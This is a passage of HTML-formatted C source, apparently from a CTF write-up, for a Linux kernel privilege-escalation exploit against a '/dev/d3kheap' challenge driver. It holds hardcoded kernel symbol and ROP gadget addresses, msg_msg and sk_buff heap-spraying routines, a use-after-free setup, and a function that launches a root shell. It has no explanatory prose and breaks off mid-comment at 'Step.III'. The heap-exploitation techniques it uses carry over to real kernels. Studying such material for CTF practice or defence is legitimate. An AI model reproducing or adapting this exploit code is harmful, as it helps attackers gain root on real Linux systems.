class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 256</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ADD     0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_EDIT    0x4321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SHOW    0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_DEL     0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FREE_PIPE_INFO 0xffffffff81327570</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_R14_POP_RBP_RET 0xffffffff81003364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_RSI_PTR 0xffffffff8105acec</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_ADD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_DEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a free object</span></span><br><span class="line">    add();</span><br><span class="line">del();</span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger UAF...&quot;</span>);</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to mark the UAF msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find out the UAF queue</span></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * the msg_msg got changed, so we can&#x27;t read out</span></span><br><span class="line"><span class="comment">         * but it tells us which one the victim is</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> retval;</span><br><span class="line">        retval=peekMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( retval&lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span 